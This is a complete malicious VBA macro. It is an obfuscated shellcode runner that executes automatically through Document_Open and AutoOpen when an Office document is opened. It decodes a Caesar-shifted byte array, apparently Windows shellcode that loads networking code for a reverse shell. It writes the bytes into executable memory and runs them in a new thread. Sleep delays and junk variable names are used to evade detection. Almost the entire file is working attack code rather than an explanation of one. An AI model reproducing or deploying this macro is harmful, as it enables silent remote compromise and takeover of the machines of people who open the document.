' DLL Imports (VirtualAlloc, CreateThread, RtlMoveMemory, Sleep)
' Grabbed From: https://pinvoke.net/
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32.dll" (ByVal lpAlex As LongPtr, ByVal dwSteve As LongPtr, ByVal flAlex As Long, ByVal flPete As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SamAdams As Long, ByVal SuperStuck As Long, ByVal SteveFastener As LongPtr, TreatParty As LongPtr, ByVal CheeseFries As Long, ByRef TimId As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDog As LongPtr, ByRef sSauce As Any, ByVal lLasagna As Long) As LongPtr
Declare Sub Sleep Lib "kernel32.dll" (ByVal dwMilliseconds As Long)

' Main function, holds our shellcode runner
Function GoCrazy()
    ' 2 second delays
    Sleep (2000)
    ' Random variable names
    Dim brad As Variant
    Dim alex As LongPtr
    Dim chris As Long
    Dim dave As Long
    Dim roman As Long
    Sleep (2000)

    ' Ceasar ciphered shellcode 
    brad = Array(4, 240, 151, 8, 8, 8, 104, 145, 237, 57, 218, 108, 147, 90, 56, 147, 90, 20, 147, 90, 28, 57, 7, 23, 191, 82, 46, 147, 122, 48, 57, 200, 180, 68, 105, 132, 10, 52, 40, 201, 215, 21, 9, 207, 81, 125, 247, 90, 147, 90, _
24, 147, 74, 68, 95, 9, 216, 147, 72, 128, 141, 200, 124, 84, 9, 216, 147, 80, 32, 147, 96, 40, 9, 219, 88, 141, 209, 124, 68, 81, 147, 60, 147, 57, 7, 9, 222, 57, 200, 180, 201, 215, 21, 9, 207, 64, 232, 125, 252, 11, _
133, 0, 67, 133, 44, 125, 232, 96, 147, 96, 44, 9, 219, 110, 147, 20, 83, 147, 96, 36, 9, 219, 147, 12, 147, 9, 216, 145, 76, 44, 44, 99, 99, 105, 97, 98, 89, 7, 232, 96, 103, 98, 147, 26, 241, 136, 7, 7, 7, 101, _
112, 59, 58, 8, 8, 112, 127, 123, 58, 103, 92, 112, 84, 127, 46, 15, 145, 240, 7, 216, 192, 152, 9, 8, 8, 49, 204, 92, 88, 112, 49, 136, 115, 8, 7, 221, 114, 18, 112, 200, 176, 57, 70, 112, 10, 8, 8, 88, 145, 238, _
88, 88, 88, 88, 72, 88, 72, 88, 112, 242, 23, 231, 232, 7, 221, 159, 114, 24, 94, 95, 112, 161, 173, 124, 105, 7, 221, 141, 200, 124, 20, 7, 86, 16, 125, 244, 112, 248, 189, 170, 94, 7, 221, 114, 8, 114, 12, 94, 95, 112, _
10, 225, 208, 103, 7, 221, 147, 62, 114, 72, 112, 8, 24, 8, 8, 94, 114, 8, 112, 96, 172, 91, 237, 7, 221, 155, 91, 114, 8, 94, 91, 95, 112, 10, 225, 208, 103, 7, 221, 9, 203, 49, 206, 125, 246, 203)
    Sleep (2000)
    
    ' Shift the shellcode byte -8 to get original byte
    For i = 0 To UBound(brad)
        brad(i) = brad(i) - 8
    Next i
    ' Allocate memory space for shellcode
    alex = VirtualAlloc(0, UBound(brad), &H3000, &H40)
    Sleep (2000)
    ' Move memory from the start of the alloc address (alex) to the size of the shellcode (chris) in total, then place the shellcode inside (dave)
    For chris = LBound(brad) To UBound(brad)
        dave = brad(chris)
        roman = RtlMoveMemory(alex + chris, dave, 1)
    Next chris
    Sleep (2000)
    ' Execute shellcode
    roman = CreateThread(0, 0, alex, 0, 0, 0)
End Function

' On document open, run the main function
Sub Document_Open()
    GoCrazy
End Sub

Sub AutoOpen()
    GoCrazy
End Sub
